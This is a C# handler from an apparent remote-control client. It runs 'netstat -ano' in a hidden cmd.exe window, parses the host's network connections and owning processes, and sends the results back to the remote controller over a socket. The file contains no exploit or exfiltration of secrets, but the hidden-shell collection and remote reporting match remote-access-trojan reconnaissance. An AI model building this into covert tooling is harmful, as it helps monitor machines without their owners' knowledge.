using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Threading;
using RemoteControl.Protocals;
using RemoteControl.Protocals.Request;
using RemoteControl.Protocals.Response;

namespace RemoteControl.Client.Handlers
{
    class RequestGetNetworkConnectionsHandler : AbstractRequestHandler
    {
        public override void Handle(SocketSession session, ePacketType reqType, object reqObj)
        {
            RunTaskThread(() =>
            {
                var resp = new ResponseGetNetworkConnections();
                resp.Connections = new List<NetworkConnectionInfo>();
                resp.CollectedAt = DateTime.Now.ToString("HH:mm:ss");

                try
                {
                    var proc = new Process();
                    proc.StartInfo.FileName = "cmd.exe";
                    proc.StartInfo.CreateNoWindow = true;
                    proc.StartInfo.UseShellExecute = false;
                    proc.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                    proc.StartInfo.RedirectStandardInput = true;
                    proc.StartInfo.RedirectStandardOutput = true;
                    proc.Start();
                    proc.StandardInput.WriteLine("netstat -ano");
                    proc.StandardInput.Close();
                    string output = proc.StandardOutput.ReadToEnd();
                    proc.WaitForExit();

                    var lines = output.Split(new[] { '\r', '\n' }, StringSplitOptions.RemoveEmptyEntries);
                    foreach (string line in lines)
                    {
                        var trimmed = line.Trim();
                        if (!trimmed.StartsWith("TCP") && !trimmed.StartsWith("UDP")) continue;
                        var cols = trimmed.Split(new[] { ' ' }, StringSplitOptions.RemoveEmptyEntries);

                        var info = new NetworkConnectionInfo();
                        info.Protocol = cols[0];
                        if (cols.Length > 1)
                        {
                            int idx = cols[1].LastIndexOf(':');
                            if (idx >= 0)
                            {
                                info.LocalAddress = cols[1].Substring(0, idx);
                                int p;
                                if (int.TryParse(cols[1].Substring(idx + 1), out p))
                                    info.LocalPort = p;
                            }
                        }
                        if (info.Protocol == "TCP" && cols.Length > 2)
                        {
                            int idx = cols[2].LastIndexOf(':');
                            if (idx >= 0)
                            {
                                info.RemoteAddress = cols[2].Substring(0, idx);
                                int p;
                                if (int.TryParse(cols[2].Substring(idx + 1), out p))
                                    info.RemotePort = p;
                            }
                        }
                        if (info.Protocol == "TCP" && cols.Length > 3)
                            info.Status = cols[3];
                        if (info.Protocol == "TCP" && cols.Length > 4)
                            int.TryParse(cols[4], out info.ProcessId);
                        if (info.Protocol == "UDP" && cols.Length > 2)
                            int.TryParse(cols[2], out info.ProcessId);

                        if (info.ProcessId > 0)
                        {
                            try
                            {
                                using (var p = Process.GetProcessById(info.ProcessId))
                                    info.ProcessName = p.ProcessName + ".exe";
                            }
                            catch { }
                        }

                        if (info.Protocol == "TCP") resp.TcpCount++;
                        else resp.UdpCount++;
                        resp.Connections.Add(info);
                    }
                    resp.Result = true;
                }
                catch (Exception ex)
                {
                    resp.Result = false;
                    resp.Message = ex.Message;
                }

                session.Send(ePacketType.PACKET_GET_NETWORK_CONNECTIONS_RESPONSE, resp);
            });
        }
    }
}
